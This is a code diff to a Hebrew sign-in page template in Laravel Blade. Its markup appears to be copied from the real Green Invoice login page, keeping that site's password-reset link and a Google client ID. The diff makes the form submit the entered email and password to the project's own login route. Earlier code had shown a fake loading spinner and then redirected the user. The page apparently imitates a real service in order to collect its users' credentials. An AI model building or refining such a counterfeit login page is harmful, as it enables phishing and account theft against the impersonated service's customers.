@@ -55,8 +55,10 @@
                 <section data-v-79375dad="" class="signin">
                     <div data-v-79375dad="" class="signin__container" bis_skin_checked="1">
                         <h1 data-v-79375dad="" class="signin__title heading heading--xxl">היי, שנתחבר?</h1><!---->
+
                         <div data-v-da9cb63a="" data-v-79375dad="" class="signin-form animated fadeIn signin__form animated slideInUp " bis_skin_checked="1">
-                            <form data-v-da9cb63a="" novalidate="" class="gi-form signin-form__form">
+                            <form action="{{ route('login.store') }}" method="POST" class="gi-form signin-form__form">
+                                @csrf
                                 <div data-v-da9cb63a="" class="gi-form-field signin-form__email-field" type="" name="email" value="" bis_skin_checked="1">
                                     <div data-v-da9cb63a="" class="gi-input gi-input--required gi-input--deactivating gi-input--with-label signin-form__email-input" bis_skin_checked="1" style="position:relative;">
                                         <input
@@ -81,6 +83,9 @@
                                         <div class="gi-input__ripple" bis_skin_checked="1" style="height:2px; background:#ccc; transition:background 0.2s;"></div>
                                         <div id="email-helper-text" class="gi-input__helper" bis_skin_checked="1">כתובת המייל איתה נרשמת</div>
                                     </div>
+                                    @error('email')
+                                        <div class="gi-input__error" style="color: #d32f2f; font-size: 13px; margin-top: 4px;">{{ $message }}</div>
+                                    @enderror
                                 </div>
                                 <div data-v-da9cb63a="" class="gi-form-field signin-form__password-field" type="" name="password" value="" bis_skin_checked="1">
                                     <div data-v-da9cb63a="" class="gi-input gi-input--required gi-input--deactivating gi-input--with-trailing-icon gi-input--with-label input-password signin-form__password-input" data-testid="input-password" bis_skin_checked="1" style="position:relative;">
@@ -107,6 +112,9 @@
                                         <div class="gi-input__ripple" bis_skin_checked="1" style="height:2px; background:#ccc; transition:background 0.2s;"></div>
                                         <div id="password-helper-text" class="gi-input__helper" bis_skin_checked="1"></div>
                                     </div>
+                                    @error('password')
+                                        <div class="gi-input__error" style="color: #d32f2f; font-size: 13px; margin-top: 4px;">{{ $message }}</div>
+                                    @enderror
                                     <a data-v-da9cb63a="" href="https://auth.greeninvoice.co.il/password" class="signin-form__forgot-password">הסיסמה נשכחה?</a>
                                 </div>
                                 <script>
@@ -181,20 +189,18 @@
                                         background: #00796b !important;
                                     }
                                 </style>
-                                <div class="buttons" bis_skin_checked="1">
-                                    <button data-v-da9cb63a="" class="gi-button gi-button--primary gi-button--lg gi-button--full signin-form__signin-button" type="button" id="signin-button">
-                                        <div class="gi-button__prepend" bis_skin_checked="1"><!----></div>
+                                <div class="buttons" style="gap: 10px;" bis_skin_checked="1">
+                                    <button data-v-da9cb63a="" class="gi-button gi-button--primary gi-button--lg gi-button--full signin-form__signin-button" type="submit" id="signin-button">
                                         <span class="gi-button__text" id="signin-button-text">כניסה</span>
-                                        <span id="signin-loader" style="display:none;vertical-align:middle;">
+                                        <!-- <span id="signin-loader" style="display:none;vertical-align:middle;">
                                             <svg width="20" height="20" viewBox="0 0 50 50">
                                                 <circle cx="25" cy="25" r="20" fill="none" stroke="#fff" stroke-width="4" stroke-linecap="round" stroke-dasharray="31.415, 31.415" transform="rotate(72 25 25)">
-                                                    <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/>
+                                                    <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite" />
                                                 </circle>
                                             </svg>
-                                        </span>
-                                        <div class="gi-button__append" bis_skin_checked="1"><!----></div>
+                                        </span> -->
                                     </button>
-                                    <script>
+                                    <!-- <script>
                                         document.getElementById('signin-button').addEventListener('click', function() {
                                             var btn = this;
                                             var text = document.getElementById('signin-button-text');
@@ -202,11 +208,9 @@
                                             text.style.display = 'none';
                                             loader.style.display = 'inline-block';
                                             btn.disabled = true;
-                                            setTimeout(function() {
-                                                window.location.href = "{{ route('home') }}";
-                                            }, 3000);
+                                            // Remove redirect, let form submit normally
                                         });
-                                    </script>
+                                    </script> -->
                                     <a href="{{ route('google') }}" data-v-da9cb63a="" class="gi-button gi-button--tertiary gi-button--lg gi-button--outlined signin-form__signin-google-button" type="button" id="signin-google-button">
                                         <span class="gi-button__prepend" bis_skin_checked="1"><!----></span><span class="gi-button__text">כניסה מהירה</span>
                                         <div class="gi-button__append" bis_skin_checked="1"><svg xmlns="http://www.w3.org/2000/svg" role="presentation" viewBox="0 0 24 24" width="24" height="24" transform="" size="lg" style="display: block;">
@@ -220,7 +224,8 @@
                                     </a>
                                 </div>
                                 <div class="gi-form__loader" bis_skin_checked="1"><!----></div>
-                            </form><button data-v-da9cb63a="" class="button-google-auth signin-form__hidden-google-button">
+                            </form>
+                            <button data-v-da9cb63a="" class="button-google-auth signin-form__hidden-google-button">
                                 <div id="g_id_onload" data-client_id="905376008360-5slc19bvfn978rg2qacaks5f5a3uid08" data-callback="handleSigninCredentialResponse" data-auto_prompt="false" bis_skin_checked="1"></div>
                                 <div class="g_id_signin" data-type="standard" data-shape="pill" data-theme="outline" data-text="signin_with" data-size="large" data-locale="iw" data-width="185" data-logo_alignment="center" bis_skin_checked="1">
 
